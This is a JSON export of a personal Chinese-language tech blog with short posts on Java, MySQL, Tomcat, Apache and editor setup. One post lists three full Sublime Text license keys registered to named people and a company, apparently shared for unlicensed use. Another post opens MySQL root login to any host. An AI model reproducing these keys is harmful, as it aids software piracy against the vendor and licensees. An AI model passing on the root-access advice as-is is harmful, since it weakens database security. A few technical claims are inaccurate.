\"\") 通过Value选择单选按钮 $(\":radio[name='object'][value='\"+object+\"']\").attr(\"checked\",'checked'); 通过Value选择Select组 $(\"#object option[value='\"+object+\"']\").attr(\"selected\",\"selected\"); 通过name选择单选按钮 $(\":radio[name='name'][value='\"+value+\"']\").attr(\"checked\",'checked'); 通过name遍历获取复选框选中元素 $(\"input:checkbox[name='supplyCheckBox']:checked\").each(function(i) { });","categories":[{"name":"Web Design","slug":"Web-Design","permalink":"http://blog.dragon-yuan.me/categories/Web-Design/"}],"tags":[]},{"title":"JavaEE中获取路径","slug":"2016-08-10-07-47-12","date":"2016-08-09T23:47:12.000Z","updated":"2016-12-23T08:28:42.245Z","comments":true,"path":"2016/08/10/2016-08-10-07-47-12/","link":"","permalink":"http://blog.dragon-yuan.me/2016/08/10/2016-08-10-07-47-12/","excerpt":"","text":"保存文件的路径 request.getServletContext().getRealPath(“”) 获取访问文件路径 request.getContextPath()","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"关于Java的序列化和serialVersionUID作用","slug":"java-serialversionuid","date":"2016-08-09T19:34:42.000Z","updated":"2016-12-23T08:33:03.151Z","comments":true,"path":"2016/08/10/java-serialversionuid/","link":"","permalink":"http://blog.dragon-yuan.me/2016/08/10/java-serialversionuid/","excerpt":"","text":"Java的序列化 当两个进程在进行远程通信时，彼此可以发送各种类型的数据。无论是何种类型的数据，都会以二进制序列的形式在网络上传送。 发送方需要把这个Java对象转换为字节序列，才能在网络上传送；接收方则需要把字节序列再恢复为Java对象。 1.把Java对象转换为字节序列的过程称为对象的序列化。 2.把字节序列恢复为Java对象的过程称为对象的反序列化。 对象的序列化主要有两种用途： 1.把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中 2.在网络上传送对象的字节序列 serialVersionUID 简单来说，Java的序列化机制是通过判断类的serialVersionUID来验证版本一致性的。 在进行反序列化时，JVM会把传来的字节流中的serialVersionUID与本地相应实体类的serialVersionUID进行比较，如果相同就认为是一致的，可以进行反序列化，否则就会出现序列化版本不一致的异常（nvalidCastException） serialVersionUID有两种显示的生成方式： 一是默认的1L，比如：private static final long serialVersionUID = 1L; 二是根据类名、接口名、成员方法及属性等来生成一个64位的哈希字段，比如 ：private static final long serialVersionUID = xxxxL; 本文来源于网络总结","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"request.getRequestDispatcher和response.sendRedirect区别","slug":"request-getrequestdispatcher-response-sendredirect","date":"2016-08-07T19:55:53.000Z","updated":"2016-12-23T08:36:23.601Z","comments":true,"path":"2016/08/08/request-getrequestdispatcher-response-sendredirect/","link":"","permalink":"http://blog.dragon-yuan.me/2016/08/08/request-getrequestdispatcher-response-sendredirect/","excerpt":"","text":"request.getRequestDispatcher(String arg0)是”转向”的意思 response.sendRedirect(String arg0)是重定向的意思 1.request.getRequestDispatcher(String arg0) 转向的特点: 地址栏的URl是不变,如:servlet –A转向到servlet—B的时候,地址栏还是A它本身,但是内容其实上已经是B的内容了 2.response.sendRedirect(String arg0) 重定向的特点: 地址栏的URL是会改变的.如:servlet–A转向到servlet–B的时候,地址栏就变成B了 重定向sendRedirect(String arg0) 跟转向的”forward()”方法有点类似之处:就是在放在它们后面的语句都不会被执行 response不能被传递","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"网页信息抓取进阶 支持Js生成数据 Jsoup的不足之处","slug":"js-jsoup","date":"2016-07-26T17:42:23.000Z","updated":"2017-09-09T07:47:17.891Z","comments":true,"path":"2016/07/27/js-jsoup/","link":"","permalink":"http://blog.dragon-yuan.me/2016/07/27/js-jsoup/","excerpt":"","text":"首先在这里写下在抓取页面数据时候遇到的问题： 经测试发现，Jsoup无法加载JS，所以无法获取到通过JS调用的数据资源。 Js乃防抓取的利器，不过同时也毁了SEO 通过HTMLUnit这个开源项目，可以模拟浏览器获取到页面信息","categories":[{"name":"Web Design","slug":"Web-Design","permalink":"http://blog.dragon-yuan.me/categories/Web-Design/"}],"tags":[]},{"title":"Java中处理double数据类型运算不精确的问题","slug":"double","date":"2016-07-24T23:00:48.000Z","updated":"2016-12-23T08:31:24.548Z","comments":true,"path":"2016/07/25/double/","link":"","permalink":"http://blog.dragon-yuan.me/2016/07/25/double/","excerpt":"","text":"1.相加 public double sum(double d1,double d2){ BigDecimal bd1 = new BigDecimal(Double.toString(d1)); BigDecimal bd2 = new BigDecimal(Double.toString(d2)); return bd1.add(bd2).doubleValue(); } 2.相减 public double sub(double d1,double d2){ BigDecimal bd1 = new BigDecimal(Double.toString(d1)); BigDecimal bd2 = new BigDecimal(Double.toString(d2)); return bd1.subtract(bd2).doubleValue(); } 3.相乘 public double mul(double d1,double d2){ BigDecimal bd1 = new BigDecimal(Double.toString(d1)); BigDecimal bd2 = new BigDecimal(Double.toString(d2)); return bd1.multiply(bd2).doubleValue(); } 4.相除 public double div(double d1,double d2,int scale){ //在之前需要判断分母是否为0，或者处理异常 BigDecimal bd1 = new BigDecimal(Double.toString(d1)); BigDecimal bd2 = new BigDecimal(Double.toString(d2)); return bd1.divide(bd2,scale,BigDecimal.ROUND_HALF_UP).doubleValue(); }","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"在Java中对多态的理解","slug":"2016-07-03-09-07-31","date":"2016-07-03T01:07:31.000Z","updated":"2016-12-23T08:28:37.307Z","comments":true,"path":"2016/07/03/2016-07-03-09-07-31/","link":"","permalink":"http://blog.dragon-yuan.me/2016/07/03/2016-07-03-09-07-31/","excerpt":"","text":"1、多态的体现 父类的引用指向了自己的子类对象 父类的引用也可以接收自己的对象 2、多态的前提 必须是类与类之间只有关系，要么继承或实现 通常还有一个前提，存在覆盖 3、多态的好处 多态的出现大大的提高了程序的扩展性 4、多态的弊端 只能使用父类的引用访问父类的成员 多态： 非静态成员中，编译看左面，运行看右面 静态成员中，编译运行都参考左面。","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"ArrayList和LinkedList何时使用","slug":"vector-list","date":"2016-06-29T22:05:11.000Z","updated":"2016-12-23T08:38:21.804Z","comments":true,"path":"2016/06/30/vector-list/","link":"","permalink":"http://blog.dragon-yuan.me/2016/06/30/vector-list/","excerpt":"","text":"1、如果你需要高效的查询，而不在乎插入和删除的效率，使用ArrayList(不同步JDK1.2) Vector(同步 JDK1.0,过时不用) 2、如果你需要大量的插入和删除，而不关心查询，则应使用LinkedList ArrayList**： 对象数量变化少，简单对象，随机访问元素频繁 (查找)** LinkedList：对象数量变化大，对象复杂，插入和删除频繁 (插入，删除)","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"在Java中对static的理解","slug":"java-static","date":"2016-06-26T19:46:53.000Z","updated":"2016-12-23T08:33:07.992Z","comments":true,"path":"2016/06/27/java-static/","link":"","permalink":"http://blog.dragon-yuan.me/2016/06/27/java-static/","excerpt":"","text":"static是不允许用来修饰局部变量。不要问为什么，这是Java语法的规定。 在《Java编程思想》P86页有这样一段话： “static方法就是没有this的方法。在static方法内部不能调用非静态方法，反过来是可以的。而且可以在没有创建任何对象的前提下，仅仅通过类本身来调用static方法。这实际上正是static方法的主要用途。” 简而言之，一句话来描述就是：方便在没有创建对象的情况下来进行调用（方法/变量）。 很显然，被static关键字修饰的方法或者变量不需要依赖于对象来进行访问，只要类被加载了，就可以通过类名去进行访问。 static可以用来修饰类的成员方法、类的成员变量，另外可以编写static代码块来优化程序性能。 感谢尊重作者劳动成果，原文链接：http://www.cnblogs.com/dolphin0520/p/3799052.html","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"文档注释中的含义","slug":"2016-06-23-05-58-25","date":"2016-06-22T21:58:25.000Z","updated":"2016-12-23T08:28:25.150Z","comments":true,"path":"2016/06/23/2016-06-23-05-58-25/","link":"","permalink":"http://blog.dragon-yuan.me/2016/06/23/2016-06-23-05-58-25/","excerpt":"","text":"1 常用Java注释标签（Java comment tags） @author 作者 @param 输入参数的名称 说明 @return 输出参数说明 @since JDK版本 @version 版本号 @see 链接目标 @throws 异常 @deprecated 注解的程序元素，不鼓励程序员使用这样的元素，通常是因为它很危险或存在更好的选择。在使用不被赞成的程序元素或在不被赞成的代码中执行重写时，编译器会发出警告。标注此类/接口、方法、字段已经被废止 @link 链接地址 2 Java注释的使用顺序 3 简单常见的HTML嵌入 4 HTML嵌入注释范例 5 参考文档 1 常用Java注释标签（Java comment tags） @author 作者适用范围：文件、类、方法 （*多个作者使用多个@author标签标识，java doc中显示按输入时间顺序罗列。） 例：* @author Leo. Yao @param 输入参数的名称 说明适用范围：方法 例：* @param str the String用来存放输出信息。 @return 输出参数说明适用范围：方法 例： * @return true执行成功; * false执行失败. @since JDK版本用于标识编译该文件所需要的JDK环境。 适用范围：文件、类 例： * @since JDK1.6 @version 版本号用于标识注释对象的版本号 适用范围：文件、类、方法 例： * @version 1.0 @see 链接目标表示参考。会在java 文档中生成一个超链接，链接到参考的类容。使用中的感觉是@see不需要包路径，对我这种懒人比较喜欢，相对{@link }这种既要加大括号，有需要包路径，我还是选择偷懒，当然你要是不介意使用import导入要link的类，那就可以达到@see的效果，所以总体来说，还是选择@see，当然两个在特殊场合下还是用法不一样的 用法： @see #field @see #Constructor(Type, Type…) @see #Constructor(Type id, Type id…) @see #method(Type, Type,…) @see #method(Type id, Type, id…) @see Class @see Class#field @see Class#Constructor(Type, Type…) @see Class#Constructor(Type id, Type id) @see Class#method(Type, Type,…) @see Class#method(Type id, Type id,…) @see package.Class @see package.Class#field @see package.Class#Constructor(Type, Type…) @see package.Class#Constructor(Type id, Type id) @see package.Class#method(Type, Type,…) @see package.Class#method(Type id, Type, id) @see package @throws 异常标识出方法可能抛出的异常 适用范围：方法 例： * @throws IOException If an input or output exception occurred @deprecated 解释标识对象过期 适用范围：文件、类、方法 @link 链接地址链接到一个目标，用法类似@see。但常放在注释的解释中形如{@link …} 例： /** * @deprecated As of JDK 1.1, replaced by * {@link #setBounds(int,int,int,int)} */ 2 Java注释的使用顺序* @author (classes and interfaces only, required) * @version (classes and interfaces only, required. See footnote 1) * @param (methods and constructors only) * @return (methods only) * @exception (@throws is a synonym added in Javadoc 1.2) * @see * @since * @serial (or @serialField or @serialData) * @deprecated (see How and When To Deprecate APIs) 参考：感谢：http://wzdacyl.blog.163.com/blog/static/1402716502010264035241/ 原文：http://java.sun.com/j2se/1.3/docs/tooldocs/win32/javadoc.html","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"解决java compiler level does not match the version of the installed java project facet","slug":"java-compiler-level-does-not-match-the-version-of-the-installed-java-project-facet","date":"2016-06-21T05:14:08.000Z","updated":"2016-12-23T08:32:18.215Z","comments":true,"path":"2016/06/21/java-compiler-level-does-not-match-the-version-of-the-installed-java-project-facet/","link":"","permalink":"http://blog.dragon-yuan.me/2016/06/21/java-compiler-level-does-not-match-the-version-of-the-installed-java-project-facet/","excerpt":"","text":"其实要解决也很简单，在资源管理器下，找到项目所在的目录，在.settings子目录里面，用文本编辑器打开org.eclipse.wst.common.project.facet.core.xml配置文件，如图所示： 修改红色画线部分，让它与项目的编译器版本设置保持一致即可。 要查看项目的编译器版本设置，在Eclipse环境中，鼠标右键选择项目，点击Properties，选择Java Compiler，可以在窗口右边看到编译器版本，如图所示： 转载：http://blog.csdn.net/chszs/article/details/8125828 感谢博主","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"Java基本数据类型","slug":"java","date":"2016-06-20T18:29:25.000Z","updated":"2016-12-23T08:33:13.317Z","comments":true,"path":"2016/06/21/java/","link":"","permalink":"http://blog.dragon-yuan.me/2016/06/21/java/","excerpt":"","text":"Java语言是静态类型的（statical typed)，也就是说所有变量和表达式的类型再编译时就已经完全确定。由于是statical typed，导致Java语言也是强类型（Strong typed）的。强类型意味着每个变量都具有一种类型，每个表达式具有一种类型，并且每种类型都是严格定义的，类型限制了变量可以hold哪些值，表达式最终产生什么值。同时限制了这些值可以进行的操作类型以及操作的具体方式。所有的赋值操作，无论是显式的还是在方法调用中通过参数传递，都要进行类型兼容性检查。 1. 数据类型：在java源代码中，每个变量都必须声明一种类型（type）。有两种类型：primitive type和reference type。引用类型引用对象（reference to object），而基本类型直接包含值（directly contain value）。因此，Java数据类型（type）可以分为两大类：基本类型（primitive types）和引用类型（reference types）。primitive types 包括boolean类型以及数值类型（numeric types）。numeric types又分为整型（integer types）和浮点型（floating-point type）。整型有5种：byte short int long char(char本质上是一种特殊的int)。浮点类型有float和double。关系整理一下如下图： 转载：原链接：http://blog.csdn.net/bingduanlbd/article/details/27790287 感谢博主","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"Centos中二级域名绑定二级目录的方法","slug":"centos","date":"2016-05-04T21:25:26.000Z","updated":"2016-12-23T08:30:39.476Z","comments":true,"path":"2016/05/05/centos/","link":"","permalink":"http://blog.dragon-yuan.me/2016/05/05/centos/","excerpt":"","text":"用文本编辑器打开Apache安装目录/etc/httpd/conf\\httpd.conf，找到“#LoadModule rewrite_module modules/mod_rewrite.so”这行，去掉前面的“#”;继续查找“AllowOverride None”，修改为“AllowOverride All”，然后，重启Apache即可。 如此，就打开了mod_rewrite模块，其功能非常的强大，这里我只讲如何绑定二级域名。 同样，我们在httpd.conf文件最后输入以下语句： RewriteEngine on RewriteMap lowercase int:tolower RewriteMap vhost txt:/etc/httpd/vhost.map RewriteCond ${lowercase:%{SERVER_NAME}} ^(.+)$ RewriteCond ${vhost:%1} ^(/.*)$ RewriteRule ^/(.*)$ %1/$1 然后重启Apache 这样，我们就能够自由设置绑定二级域名了。 温馨提示：这个httpd.conf大家注意备份，我就曾经不小心误删，弄的极其的凄惨呀!! 之后在/etc/httpd(即Apache安装目录)下新建一个vhost.map，用文本编辑器来绑定，极其简单，我的是这样写的： bbs.xxx.com /var/www/html/bbs home.xxx.com /var/www/html/home potplayer.xxx.com /var/www/html/potplayer 我们可以随意把二级域名与目录绑定，保存就行，并且不用重启Apache，非常方便。 本文章全部来源于互联网，版权归属于原作者。本站所有转载文章言论不代表本站观点，如是侵犯了原作者的权利请发邮件联系站长（plu_huajuan@163.com），收到后立即删除。","categories":[{"name":"Operations","slug":"Operations","permalink":"http://blog.dragon-yuan.me/categories/Operations/"}],"tags":[]},{"title":"MediaDrop代码","slug":"mediadrop","date":"2016-04-28T03:36:22.000Z","updated":"2016-12-23T08:34:09.336Z","comments":true,"path":"2016/04/28/mediadrop/","link":"","permalink":"http://blog.dragon-yuan.me/2016/04/28/mediadrop/","excerpt":"","text":"source venv/bin/activate setsid paster serve --reload deployment.ini","categories":[{"name":"Operations","slug":"Operations","permalink":"http://blog.dragon-yuan.me/categories/Operations/"}],"tags":[]},{"title":"Windows - MySQL设置编码","slug":"windows-mysql","date":"2016-04-24T00:35:43.000Z","updated":"2016-12-23T08:38:54.483Z","comments":true,"path":"2016/04/24/windows-mysql/","link":"","permalink":"http://blog.dragon-yuan.me/2016/04/24/windows-mysql/","excerpt":"","text":"mysql&gt; SHOW VARIABLES ``LIKE &#39;character%&#39;``; SET character_set_client = utf8; SET character_set_connection = utf8; SET character_set_database = utf8; SET character_set_results = utf8; SET character_set_server = utf8;","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"Emmet:HTML/CSS","slug":"emmet-html-css","date":"2016-03-11T03:07:38.000Z","updated":"2016-12-23T08:32:07.079Z","comments":true,"path":"2016/03/11/emmet-html-css/","link":"","permalink":"http://blog.dragon-yuan.me/2016/03/11/emmet-html-css/","excerpt":"","text":"Sublime 3","categories":[{"name":"Web Design","slug":"Web-Design","permalink":"http://blog.dragon-yuan.me/categories/Web-Design/"}],"tags":[]},{"title":"Sublime Text 3 安装Package Control ","slug":"sublime-text-3-package-control","date":"2016-03-09T04:09:53.000Z","updated":"2016-12-23T08:37:14.826Z","comments":true,"path":"2016/03/09/sublime-text-3-package-control/","link":"","permalink":"http://blog.dragon-yuan.me/2016/03/09/sublime-text-3-package-control/","excerpt":"","text":"view ----- show control import urllib.request,os; pf = &#39;Package Control.sublime-package&#39;``; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); open``(os.path.join(ipp, pf), &#39;wb&#39;``).write(urllib.request.urlopen( &#39;[http://sublime.wbond.net/](http://sublime.wbond.net/)&#39; + pf.replace(``&#39; &#39;``,``&#39;%20&#39;``)).read())","categories":[{"name":"Web Design","slug":"Web-Design","permalink":"http://blog.dragon-yuan.me/categories/Web-Design/"}],"tags":[]},{"title":"Sublime Text 3  Bulid 3090+ KEY","slug":"sublime-text-3-bulid-3090-key","date":"2016-03-09T03:46:30.000Z","updated":"2016-12-23T08:37:05.482Z","comments":true,"path":"2016/03/09/sublime-text-3-bulid-3090-key/","link":"","permalink":"http://blog.dragon-yuan.me/2016/03/09/sublime-text-3-bulid-3090-key/","excerpt":"","text":"—– BEGIN LICENSE —– Michael Barnes Single User License EA7E-821385 8A353C41 872A0D5C DF9B2950 AFF6F667 C458EA6D 8EA3C286 98D1D650 131A97AB AA919AEC EF20E143 B361B1E7 4C8B7F04 B085E65E 2F5F5360 8489D422 FB8FC1AA 93F6323C FD7F7544 3F39C318 D95E6480 FCCC7561 8A4A1741 68FA4223 ADCEDE07 200C25BE DBBC4855 C4CFB774 C5EC138C 0FEC1CEF D9DCECEC D3A5DAD1 01316C36 —— END LICENSE —— —– BEGIN LICENSE —– Free Communities Consultoria em Informática Ltda Single User License EA7E-801302 C154C122 4EFA4415 F1AAEBCC 315F3A7D 2580735A 7955AA57 850ABD88 72A1DDD8 8D2CE060 CF980C29 890D74F2 53131895 281E324E 98EA1FEF 7FF69A12 17CA7784 490862AF 833E133D FD22141D D8C89B94 4C10A4D2 24693D70 AE37C18F 72EF0BE5 1ED60704 651BC71F 16CA1B77 496A0B19 463EDFF9 6BEB1861 CA5BAD96 89D0118E —— END LICENSE —— —– BEGIN LICENSE —– Daniel Russel Single User License EA7E-917420 9327EC62 44020C2A 45172A68 12FE13F1 1D22245B 680892EE F551F8EB C183D032 8B4EDB4B 479CB7E4 07E42EDD A780021D 56BADF42 AC05238B 023B47B1 EBA1B7DE 6DF9A383 159F32AE 04EBE100 1278B1D2 52E81B60 C68AA2E8 F84A20BE FE7990EB 5D44E4B6 16369263 1DDAACBC 280FF19E 86CF4319 0B8615A8 4FF0512E B123B8EC —— END LICENSE ——","categories":[{"name":"Operations","slug":"Operations","permalink":"http://blog.dragon-yuan.me/categories/Operations/"}],"tags":[]},{"title":"使用CSS让input标签去掉点击后出现的边框","slug":"css-input","date":"2016-03-01T16:42:31.000Z","updated":"2016-12-23T08:31:14.805Z","comments":true,"path":"2016/03/02/css-input/","link":"","permalink":"http://blog.dragon-yuan.me/2016/03/02/css-input/","excerpt":"","text":"CSS： outline:none;","categories":[{"name":"Web Design","slug":"Web-Design","permalink":"http://blog.dragon-yuan.me/categories/Web-Design/"}],"tags":[]},{"title":"Linux部署Java Web项目","slug":"linux-java-web","date":"2016-02-10T03:36:03.000Z","updated":"2016-12-23T08:33:59.597Z","comments":true,"path":"2016/02/10/linux-java-web/","link":"","permalink":"http://blog.dragon-yuan.me/2016/02/10/linux-java-web/","excerpt":"","text":"下载java - jdk，地址：http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html tar -zxvf jdk-8u65-linux-i586.gz mv jdk1.8.0_65 java cd java # 配置环境变量vim /etc/profileJAVA_HOME=~/java PATH=$JAVA_HOME/bin:$PATH CLASSPATH=$JAVA_HOME/jre/lib/ext:$JAVA_HOME/lib/tools.jar export PATH JAVA_HOME CLASSPATH source /etc/profile 验证是否成功java -version 下载tomcat linux的包，地址：http://tomcat.apache.org/download-80.cgi，下载的版本是8.0 解压后进入tomcat/bin/startup.sh查看是否成功 在Linux下面的防火墙里面开放8080端口 会用命令如下： vim /etc/sysconfig/iptables 重启service iptables restart # Linux中设置tomcat的开机启动vim /etc/rc.d/rc.local export JAVA_HOME=~/java export CLASSPATH=.:$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar export PATH=$PATH:$JAVA_HOME/bin export CATALINA_HOME=~/tomcat/ ~/tomcat/bin/startup.sh 最后导出war包，然后放入webapp中","categories":[{"name":"Operations","slug":"Operations","permalink":"http://blog.dragon-yuan.me/categories/Operations/"}],"tags":[]},{"title":"MySQL 5.5/5.6的修改字符集编码为UTF-8","slug":"mysql-5-5-5-6-utf-8","date":"2016-02-09T19:15:48.000Z","updated":"2016-12-23T08:34:48.562Z","comments":true,"path":"2016/02/10/mysql-5-5-5-6-utf-8/","link":"","permalink":"http://blog.dragon-yuan.me/2016/02/10/mysql-5-5-5-6-utf-8/","excerpt":"","text":"登录MySQL查看用SHOW VARIABLES LIKE ‘character%’;下字符集 1、在[client]字段里加入default-character-set=utf8，如下：[client] port = 3306 socket = /var/lib/mysql/mysql.sock default-character-set=utf82、在[mysqld]字段里加入character-set-server=utf8，如下：[mysqld] port = 3306 socket = /var/lib/mysql/mysql.sock character-set-server=utf83、在[mysql]字段里加入default-character-set=utf8，如下：[mysql] no-auto-rehash default-character-set=utf8 &lt;span style=&quot;color: #002200;&quot;&gt;&lt;span style=&quot;line-height: 22.5px;&quot;&gt;修改完成后，service mysql restart重启mysql服务就生效&lt;/span&gt;&lt;/span&gt; &lt;span&gt;&lt;span style=&quot;color: #002200;&quot;&gt;&lt;span style=&quot;line-height: 22.5px;&quot;&gt;使用SHOW VARIABLES LIKE ‘character%’;查看，发现数据库编码全已改成utf8。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;","categories":[{"name":"Operations","slug":"Operations","permalink":"http://blog.dragon-yuan.me/categories/Operations/"}],"tags":[]},{"title":"Mysql远程连接 Host * is not allowed to connect to this MySQL server","slug":"mysql-host-is-not-allowed-to-connect-to-this-mysql-server","date":"2016-02-08T22:49:02.000Z","updated":"2016-12-23T08:34:53.180Z","comments":true,"path":"2016/02/09/mysql-host-is-not-allowed-to-connect-to-this-mysql-server/","link":"","permalink":"http://blog.dragon-yuan.me/2016/02/09/mysql-host-is-not-allowed-to-connect-to-this-mysql-server/","excerpt":"","text":"mysql -u root -p mysql&gt;use mysql; mysql&gt;update user set host =’%’where user =’root’; mysql&gt;flush privileges; #修改host值（以通配符%的内容增加主机/IP地址，当然也可以直接增加某个特定IP地址 如果执行update语句时出现ERROR 1062 (23000): Duplicate entry ‘%-root’ for key ‘PRIMARY’ 错误 需要select host from user where user = ‘root’; 查看一下host是否已经有了%这个值，如果有了直接执行下面的flush privileges; quit","categories":[{"name":"Operations","slug":"Operations","permalink":"http://blog.dragon-yuan.me/categories/Operations/"}],"tags":[]},{"title":"Tomcat针对读取文件问题 Not allowed to load local resource解决办法","slug":"tomcat-not-allowed-to-load-local-resource","date":"2016-01-06T01:54:21.000Z","updated":"2016-12-23T08:37:50.385Z","comments":true,"path":"2016/01/06/tomcat-not-allowed-to-load-local-resource/","link":"","permalink":"http://blog.dragon-yuan.me/2016/01/06/tomcat-not-allowed-to-load-local-resource/","excerpt":"","text":"Servlet转发到JSP页面后&lt;img style=&quot;height:50px; width:50px&quot; name=&quot;student&quot; src=&quot;C:/jboss/welcome-content/students/&apos;+ studentBasic.photo+ &apos;&quot; /&gt;不允许用文件的绝对路径 而需要这样写src&lt;img style=&quot;height:50px; width:50px&quot; name=&quot;student&quot; src=&quot;/students/&quot;+studentBasic.photo+&quot;","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"2016 - Dragon's Life","slug":"gallery-mylife-2016","date":"2015-12-31T16:00:00.000Z","updated":"2017-12-13T14:17:19.521Z","comments":true,"path":"2016/01/01/gallery-mylife-2016/","link":"","permalink":"http://blog.dragon-yuan.me/2016/01/01/gallery-mylife-2016/","excerpt":"","text":"","categories":[{"name":"Gallery","slug":"Gallery","permalink":"http://blog.dragon-yuan.me/categories/Gallery/"}],"tags":[]},{"title":"浅谈MVC思想","slug":"mvc","date":"2015-12-26T19:52:28.000Z","updated":"2016-12-23T08:34:24.505Z","comments":true,"path":"2015/12/27/mvc/","link":"","permalink":"http://blog.dragon-yuan.me/2015/12/27/mvc/","excerpt":"","text":"Model 模型层 JAVA业务逻辑 —— DTO数据层 —— DAO实体层 —— 接口 —— 方法 —— SERVICE服务层 View 视图层 Controller 控制层 页面和数据间的交互 —— SERVLET ———————————————————————————— Utils 中间件层 DB的封装 —— JDBC Filter 过滤层","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"JS在MyEclipse中报错解决办法","slug":"js-myeclipse","date":"2015-12-25T19:07:13.000Z","updated":"2016-12-23T08:33:48.956Z","comments":true,"path":"2015/12/26/js-myeclipse/","link":"","permalink":"http://blog.dragon-yuan.me/2015/12/26/js-myeclipse/","excerpt":"","text":"1. 选中报错的jquery文件“jquery-1.2.6.min.js”2. 右键选择 MyEclipse–&gt;Exclude From Validation。","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"JDBC常用四大API","slug":"jdbc-api","date":"2015-12-23T02:34:58.000Z","updated":"2016-12-23T08:33:22.405Z","comments":true,"path":"2015/12/23/jdbc-api/","link":"","permalink":"http://blog.dragon-yuan.me/2015/12/23/jdbc-api/","excerpt":"","text":"1. DriverManager 获取数据库的驱动 2. Conntion 数据库连接对象 3. Statement / PrepareStatement 数据库语句对象 4. ResultSet 结果封装 导入数据库Jar包 getConnection(url,user,pwd) createStatement() prepareStatement(String sql) int executeUpdate() 增删改 executeQuery() 查询","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"将MyEclipse的默认编码改成UTF-8","slug":"myeclipse-utf-8","date":"2015-12-22T19:48:49.000Z","updated":"2016-12-23T08:34:29.455Z","comments":true,"path":"2015/12/23/myeclipse-utf-8/","link":"","permalink":"http://blog.dragon-yuan.me/2015/12/23/myeclipse-utf-8/","excerpt":"","text":"都修改成UTF8的方法：1、windows-&gt;Preferences…打开”首选项”对话框， 左侧导航树，导航到general-&gt;Workspace，右侧 Text file encoding，选择Other，改变为UTF-8，以后新建立工程其属性对话框中的Text file encoding即为UTF-8。 2、 windows-&gt;Preferences…打开”首选项”对话框，左侧导航树，导航到general-&gt;Content Types，右侧Context Types树，点开Text，选择Java Source File，在下面的Default encoding输入框中输入UTF-8，点Update，则设置Java文件编码为UTF-8。其他java应用开发相关的文件 如：properties、XML等已经由MyEclipse缺省指定，分别为ISO8859-1，UTF-8，如开发中确需改变编码格式则可以在此指定。","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"MySQL基础语句","slug":"mysql2","date":"2015-12-22T04:38:03.000Z","updated":"2016-12-23T08:35:07.481Z","comments":true,"path":"2015/12/22/mysql2/","link":"","permalink":"http://blog.dragon-yuan.me/2015/12/22/mysql2/","excerpt":"","text":"1.show databases; 2.use 数据库; 3.show tables; 4.desc 表; PRI主键 MUL外键","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"MySQL中字段类型","slug":"mysql","date":"2015-12-22T04:34:33.000Z","updated":"2016-12-23T08:35:01.337Z","comments":true,"path":"2015/12/22/mysql/","link":"","permalink":"http://blog.dragon-yuan.me/2015/12/22/mysql/","excerpt":"","text":"基础： char、varchar、text和nchar、nvarchar、ntext的区别 1、CHAR。CHAR存储定长数据很方便，CHAR字段上的索引效率级高，比如定义char(10)，那么不论你存储的数据是否达到了10个字节，都要占去10个字节的空间,不足的自动用空格填充。 2、VARCHAR。存储变长数据，但存储效率没有CHAR高。如果一个字段可能的值是不固定长度的，我们只知道它不可能超过10个字符，把它定义为 VARCHAR(10)是最合算的。VARCHAR类型的实际长度是它的值的实际长度+1。为什么“+1”呢？这一个字节用于保存实际使用了多大的长度。从空间上考虑，用varchar合适；从效率上考虑，用char合适，关键是根据实际情况找到权衡点。 3、TEXT。text存储可变长度的非Unicode数据，最大长度为2^31-1(2,147,483,647)个字符。 4、NCHAR、NVARCHAR、NTEXT。这三种从名字上看比前面三种多了个“N”。它表示存储的是Unicode数据类型的字符。我们知道字符中，英文字符只需要一个字节存储就足够了，但汉字众多，需要两个字节存储，英文与汉字同时存在时容易造成混乱，Unicode字符集就是为了解决字符集这种不兼容的问题而产生的，它所有的字符都用两个字节表示，即英文字符也是用两个字节表示。nchar、nvarchar的长度是在1到4000之间。和char、varchar比较起来，nchar、nvarchar则最多存储4000个字符，不论是英文还是汉字；而char、varchar最多能存储8000个英文，4000个汉字。可以看出使用nchar、nvarchar 数据类型时不用担心输入的字符是英文还是汉字，较为方便，但在存储英文时数量上有些损失。 进一步学习： char、varchar、text、ntext、bigint、int、smallint、tinyint和bit的区别及数据库的数据类型 Varchar 对每个英文(ASCII)字符都占用2个字节，对一个汉字也只占用两个字节 char 对英文(ASCII)字符占用1个字节，对一个汉字占用2个字节Varchar 的类型不以空格填满，比如varchar(100)，但它的值只是“qian”,则它的值就是“qian”而char 不一样，比如char(100),它的值是“qian”，而实际上它在数据库中是“qian 